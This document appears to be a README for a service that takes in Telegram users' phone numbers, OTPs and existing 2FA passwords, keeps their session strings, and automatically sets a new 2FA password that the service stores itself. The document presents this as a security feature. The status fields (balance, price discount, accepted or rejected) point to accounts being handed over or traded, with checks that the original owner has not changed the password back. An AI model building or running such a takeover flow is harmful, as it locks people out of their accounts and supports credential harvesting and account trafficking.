# Telegram 2FA Automation System

This document describes the automated Telegram two-step password (2FA) setup and validation system.

## Overview

The system automatically sets up and validates 2FA passwords on Telegram accounts after users log in. Accounts that fail 2FA validation are automatically rejected as "frozen" to ensure security.

## Features

### 1. Automatic 2FA Setup
- After successful login (OTP + optional existing 2FA verification), the system automatically:
  - Generates a secure random 2FA password
  - Sets/updates the 2FA password on the Telegram account
  - Validates that the password was set correctly
  - Updates account status based on validation results

### 2. Account Status Tracking
Each account tracks three key statuses:

#### Acceptance Status
- **Accepted**: Account has been validated and accepted
- **Rejected**: Account has been rejected (failed 2FA validation)
- **Pending**: Account is awaiting validation

#### Limit Status
- **Free**: Account is operational with temporary limits
- **Frozen**: Account is frozen due to validation failure
- **Unlimited**: No limits applied

#### Validation Status
- **Validated**: 2FA password successfully verified
- **Failed**: 2FA validation failed (password changed or not set)
- **Pending**: Validation not yet performed

### 3. Automated Rejection
Accounts are automatically rejected and marked as "frozen" if:
- 2FA password cannot be set
- No 2FA password is detected after setup
- 2FA password validation fails (password was changed)

## API Endpoints

### POST /api/accounts/auto-setup-2fa
Automatically set up and validate 2FA password after account login.

**Request:**
```json
{
  "phoneNumber": "+1234567890",
  "telegramId": 123456789,
  "currentPassword": "existing-password" // Optional, if account already has 2FA
}
```

**Response (Success):**
```json
{
  "success": true,
  "message": "Account validated and accepted successfully",
  "validation_status": "validated",
  "acceptance_status": "accepted",
  "has_2fa": true
}
```

**Response (Failure):**
```json
{
  "success": false,
  "error": "2FA_VALIDATION_FAILED",
  "message": "Account rejected - 2FA password cannot be verified",
  "validation_status": "failed",
  "acceptance_status": "rejected"
}
```

### POST /api/telegram/auth/set-2fa
Manually set or change 2FA password on a Telegram account.

**Request:**
```json
{
  "phoneNumber": "+1234567890",
  "newPassword": "new-secure-password",
  "currentPassword": "existing-password", // Required if 2FA already exists
  "telegramId": 123456789
}
```

### POST /api/accounts/validate
Validate 2FA password and update account status.

**Request:**
```json
{
  "phoneNumber": "+1234567890",
  "password": "2fa-password",
  "telegramId": 123456789
}
```

### POST /api/accounts/details
Get detailed account status information.

**Request:**
```json
{
  "phoneNumber": "+1234567890",
  "telegramId": 123456789
}
```

**Response:**
```json
{
  "success": true,
  "account": {
    "phone_number": "+1234567890",
    "balance": 10.50,
    "acceptance_status": "rejected",
    "acceptance_message": "Unfortunately, the account has been rejected",
    "limit_status": "free",
    "limit_message": "The account is temporary limited and will not cause any price discount",
    "validation_status": "failed",
    "validation_message": "The account's 2FA password has been changed and cannot be verified",
    "created_at": "2025-10-30T12:00:00Z",
    "validated_at": null,
    "approved_at": null
  }
}
```

## UI Components

### AccountStatusDetails Component
Displays detailed account status matching the design in the screenshot.

**Usage:**
```tsx
import { AccountStatusDetails } from '@/components/account-status-details'

<AccountStatusDetails 
  phoneNumber="+1234567890"
  telegramId={123456789}
  countryFlag="🇵🇦"
  onClose={() => console.log('Close clicked')}
/>
```

**Features:**
- Shows phone number and balance
- Displays acceptance status with appropriate icon (✓ or ✗)
- Shows limit status
- Displays validation status with detailed message
- Real-time data fetching from API

### Account Status Page
Visit `/account-status?phone=+1234567890&telegramId=123456789` to view account details.

## Workflow

### Login Flow with Auto 2FA Setup

```
1. User provides phone number
   ↓
2. System sends OTP
   ↓
3. User enters OTP
   ↓
4. If 2FA required: User enters current password
   ↓
5. Login successful
   ↓
6. **AUTO 2FA SETUP TRIGGERED**
   ↓
7. Generate random secure password
   ↓
8. Set/update 2FA password on Telegram
   ↓
9. Validate the new password
   ↓
10. Update account status:
    - If validation succeeds: Accept account
    - If validation fails: Reject as frozen
```

### Database Schema

The `accounts` collection includes these fields for 2FA tracking:

```typescript
{
  // ... existing fields ...
  
  // 2FA Fields
  has_2fa: boolean,
  twofa_password: string,
  twofa_set_at: Date,
  
  // Status Fields
  validation_status: 'validated' | 'failed' | 'pending',
  acceptance_status: 'accepted' | 'rejected' | 'pending',
  limit_status: 'free' | 'frozen' | 'unlimited',
  
  // Additional Info
  rejection_reason: string,
  validated_at: Date,
  updated_at: Date
}
```

## Scripts

### Validate All Accounts
Run the validation script to check all pending accounts:

```bash
npm run validate-accounts
# or
npx ts-node scripts/validate-all-accounts.ts
```

This script:
- Finds all accounts with `validation_status: 'pending'`
- Validates 2FA password for each account
- Updates account status based on validation results
- Provides summary statistics

## Integration with Existing Login Flow

The auto-setup workflow is integrated into the verify-2FA endpoint:

```typescript
// In /api/telegram/auth/verify-2fa/route.ts

// After successful login
if (result.success) {
  // Trigger automatic 2FA setup and validation
  const autoSetupResponse = await fetch('/api/accounts/auto-setup-2fa', {
    method: 'POST',
    body: JSON.stringify({ phoneNumber, telegramId, currentPassword })
  })
  
  const autoSetupData = await autoSetupResponse.json()
  
  if (autoSetupData.success) {
    // Account validated and accepted
    return { success: true, validation_status: 'validated' }
  } else {
    // Account rejected
    return { success: false, acceptance_status: 'rejected' }
  }
}
```

## Security Features

1. **Random Password Generation**: Uses crypto.randomBytes for secure password generation
2. **Automatic Validation**: Immediately validates password after setting
3. **Rejection on Failure**: Automatically rejects accounts that fail validation
4. **Session-based Auth**: Uses existing Telegram session strings for authentication
5. **Status Tracking**: Comprehensive tracking of account validation state

## Error Handling

The system handles various error scenarios:

- **Session Not Found**: Returns 404 if Telegram session doesn't exist
- **Current Password Required**: Returns 400 if changing existing 2FA without current password
- **2FA Set Failed**: Rejects account with appropriate error message
- **2FA Validation Failed**: Rejects account as frozen
- **No 2FA Detected**: Rejects account as frozen

## Best Practices

1. **Monitor Validation**: Regularly check validation status of accounts
2. **Run Validation Script**: Periodically run the validate-all-accounts script
3. **Handle Rejections**: Notify users when their accounts are rejected
4. **Secure Passwords**: Store 2FA passwords securely in database
5. **Rate Limiting**: Add delays between validations to avoid Telegram rate limits

## Troubleshooting

### Account Rejected After Login

**Possible Causes:**
- 2FA password couldn't be set on Telegram
- 2FA validation failed immediately after setting
- Account's 2FA was changed externally

**Solution:**
- Check account validation_status and rejection_reason in database
- Review logs for specific error messages
- Verify Telegram session is valid

### Validation Script Fails

**Possible Causes:**
- Session files missing or corrupted
- Database connection issues
- Telegram API rate limiting

**Solution:**
- Ensure session files exist in `telegram_sessions/` directory
- Check database connectivity
- Add delays between validations
- Review error logs for specific issues

## Future Enhancements

Potential improvements:
- Email notification on account rejection
- Retry mechanism for failed validations
- Scheduled automatic validation checks
- Admin dashboard for viewing validation status
- Bulk validation API endpoint
- 2FA password rotation system
